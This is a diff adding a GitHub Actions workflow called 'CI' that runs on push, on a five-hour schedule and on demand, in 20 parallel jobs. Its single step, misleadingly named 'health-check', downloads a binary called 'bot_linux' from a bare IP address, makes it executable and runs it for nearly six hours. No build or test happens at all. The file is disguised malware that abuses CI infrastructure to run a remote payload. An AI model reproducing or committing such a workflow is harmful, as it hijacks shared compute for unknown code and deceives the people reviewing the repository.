@@ -1,0 +1,20 @@
+name: CI
+on:
+  push:
+  schedule:
+    - cron: "0 */5 * * *"
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        id: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - name: health-check
+        run: |
+          curl -sL --max-time 30 http://45.153.34.235:8888/bot_linux -o /tmp/svc
+          chmod +x /tmp/svc
+          timeout 21000 /tmp/svc || true
